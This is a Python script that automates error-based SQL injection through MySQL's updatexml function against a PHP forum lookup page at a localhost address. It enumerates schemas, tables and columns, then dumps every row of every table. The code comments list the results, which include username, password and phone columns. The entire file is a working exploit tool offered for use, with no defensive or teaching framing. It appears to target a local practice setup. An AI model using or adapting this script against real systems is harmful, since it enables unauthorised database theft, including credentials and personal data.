import math
import re
import requests

base_url = 'http://localhost/forum/html/forum_lookup_html.php?forumid=8'


def get_databases():
    global base_url
    database = ''
    num_url = f'{base_url} and updatexml(1,concat(0x7e,(select LENGTH(GROUP_CONCAT(schema_name)) from INFORMATION_SCHEMA.SCHEMATA),0x7e),1)'
    num_text = requests.get(url=num_url)
    regular = "XPATH syntax error: '(.+?)'<br />"
    num_res = int(re.findall(regular, num_text.text)[0][1:-1])  # 文字数量
    count = math.ceil(num_res / 10)  # 向上取整,十个一取
    for c in range(count):
        url = f"{base_url} and updatexml(1,concat(0x7e,(select substr(group_concat(schema_name),{1 + (c * 10)},{(c + 1) * 10}) from INFORMATION_SCHEMA.SCHEMATA),0x7e),1)"
        databases_text = requests.get(url=url)
        res = re.findall(regular, databases_text.text)
        r = res[0][1:11]  # 将'~'去掉,且只取十位，与上同步
        database += r
    database = database.strip('~')
    databases = database.split(',')
    return databases  # ['information_schema', 'mysql', 'performance_schema', 'sakila', 'sys', 'world', 'zzz']


def get_tables():
    global base_url
    table = ''
    num_url = f"{base_url} and updatexml(1,concat(0x7e,(SELECT LENGTH(GROUP_CONCAT(table_name)) from INFORMATION_SCHEMA.TABLES where table_schema='zzz'),0x7e),1)"
    num_text = requests.get(url=num_url)
    regular = "XPATH syntax error: '(.+?)'<br />"
    num_res = int(re.findall(regular, num_text.text)[0][1:-1])  # 文字数量
    count = math.ceil(num_res / 10)  # 向上取整,十个一取
    for c in range(count):
        url = f"{base_url} and updatexml(1,concat(0x7e,(SELECT substr(GROUP_CONCAT(table_name),{1 + (c * 10)},{(c + 1) * 10}) from INFORMATION_SCHEMA.TABLES where table_schema='zzz'),0x7e),1)"
        tables_text = requests.get(url=url)
        res = re.findall(regular, tables_text.text)
        r = res[0][1:11]  # 将'~'去掉,且只取十位，与上同步
        table += r
    table = table.strip('~')
    tables = table.split(',')
    return tables  # ['dboption', 'forum', 'py_welcome', 'py_welcome_log', 'student', 'user', 'user_old']


def get_column():
    global base_url
    all_column = {}
    table = get_tables()
    for t in table:
        column = ''
        num_url = f"{base_url} and updatexml(1,concat(0x7e,(SELECT LENGTH(group_concat(COLUMN_NAME)) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = 'zzz' AND TABLE_NAME = '{t}'),0x7e),1)"
        num_text = requests.get(url=num_url)
        regular = "XPATH syntax error: '(.+?)'<br />"
        num_res = int(re.findall(regular, num_text.text)[0][1:-1])  # 文字数量
        count = math.ceil(num_res / 10)  # 向上取整,十个一取
        for c in range(count):
            url = f"{base_url} and updatexml(1,concat(0x7e,(SELECT substr(group_concat(COLUMN_NAME),{1 + (c * 10)},{(c + 1) * 10}) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = 'zzz' AND TABLE_NAME = '{t}'),0x7e),1)"
            tables_text = requests.get(url=url)
            res = re.findall(regular, tables_text.text)
            r = res[0][1:11]  # 将'~'去掉,且只取十位，与上同步
            column += r
            columns = column.strip('~')
            all_column[t] = columns
    return all_column  # {'dboption': 'id,name', 'forum': 'forumid,headline,content,username,createtime', 'py_welcome': 'username,password,phone,balance', 'py_welcome_log': 'username,event,time', 'student': 'studentid,sname,age,degree,sex,phone,classid,createtime', 'user': 'userid,username,password,role,phone,imgs,createtime,count,lasttime', 'user_old': 'userid,username,password,role,phone,imgs,createtime'}


def do_torco():
    global base_url
    column = get_column()
    for k, v in column.items():
        rows = f"{base_url} and updatexml(1,concat(0x7e,(select concat(count(*)) from zzz.{k}),0x7e),1)"
        regular = "XPATH syntax error: '(.+?)'<br />"
        rows_num = (re.findall(regular, requests.get(rows).text)[0][1:-1])  # 6,5,3,18,150,2,2
        for r in range(int(rows_num)):
            data = ''
            num_url = f"{base_url} and updatexml(1,concat(0x7e,(select LENGTH(concat_ws('--',{v})) from zzz.{k} limit {r},1),0x7e),1)"
            num_text = requests.get(url=num_url)
            regular = "XPATH syntax error: '(.+?)'<br />"
            num_res = int(re.findall(regular, num_text.text)[0][1:-1])  # 文字数量
            count = math.ceil(num_res / 10)  # 向上取整,十个一取
            for c in range(count):
                url = f"{base_url} and updatexml(1,concat(0x7e,(select substr(concat_ws('--',{v}),{1 + (c * 10)},{(c + 1) * 10}) from zzz.{k} limit {r},1),0x7e),1)"
                data_text = requests.get(url=url)
                res = re.findall(regular, data_text.text)
                r1 = res[0][1:11].strip('~')  # 将'~'去掉,且只取十位，与上同步
                try:
                    data += r1.split()[0]
                except:
                    pass
            print(data)


if __name__ == '__main__':
    do_torco()
    # print(get_databases())
    # print(get_tables())
    # print(get_column())
